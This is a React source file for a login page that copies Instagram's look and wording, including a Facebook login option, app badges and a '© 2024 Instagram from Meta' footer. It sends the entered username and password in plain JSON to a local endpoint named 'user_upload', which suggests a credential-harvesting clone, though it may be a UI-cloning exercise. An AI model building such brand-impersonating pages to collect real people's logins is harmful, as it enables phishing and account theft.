import React, { useState } from "react";
import axios from 'axios';

import logo from "./assets/Screenshot 2024-05-04 at 2.37.00 PM.png";
import appStore from "./assets/58333503858.png";
import playStore from "./assets/Screenshot 2024-05-04 at 2.28.33 PM.png";
import facebook from "./assets/Screenshot 2024-05-04 at 10.20.45 PM.png";

function Login() {
    const [userName, setUserName] = useState(''); 
    const [password, setPassword] = useState(''); 

    const handleUpload = async (e) => {
        e.preventDefault();
        try {
            const response = await axios.post('http://localhost:3000/api/user_upload', {
                userName: userName,
                password: password
            }, {
                headers: { "Content-Type": "application/json" }
            });
            console.log('Login successful', response.data);
        } catch (error) {
            console.error('Login failed', error.response ? error.response.data : error.message);
        }
    };
    
    

    return (
        <div>
            <form onSubmit={handleUpload}>
                <img id="logo" src={logo} alt="Logo" />
                <input type="text" id="username" placeholder="Phone number, username, or email" value={userName} onChange={(e) => setUserName(e.target.value)} />
                <input type="password" id="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
                <button type="submit">Log in</button>
                <p id="or">OR</p>
                <p id="facebook"> 
                    <img src={facebook} alt="Log in with Facebook" id="fbimg" />
                    Log in with Facebook
                </p>
                <p id="forgot_pass">Forgot Password?</p>
            </form>
            <div id="opt">
                <p>Don't have an account? <a href="">Sign up</a></p>
            </div>
            <h3>Get the app</h3>
            <div id="apps">
                <img src={appStore} alt="App Store" id="appstore" />
                <img src={playStore} alt="Play Store" id="playstore" />
            </div>
            <footer>
                <li id="padding1">
                    <ul>Meta</ul>
                    <ul>About</ul>
                    <ul>Blog</ul>
                    <ul>Jobs</ul>
                    <ul>Help</ul>
                    <ul>Api</ul>
                    <ul>Privacy</ul>
                    <ul>Terms</ul>
                    <ul>Locations</ul>
                    <ul>Instagram Lite</ul>
                    <ul>Threads</ul>
                    <ul>Contact Uploading & Non-Users</ul>
                    <ul>Meta Verified</ul>
                </li>
                <li id="padding2">
                    <ul>English</ul>
                    <ul>© 2024 Instagram from Meta</ul>
                </li>
            </footer>
        </div>
    );
}

export default Login;
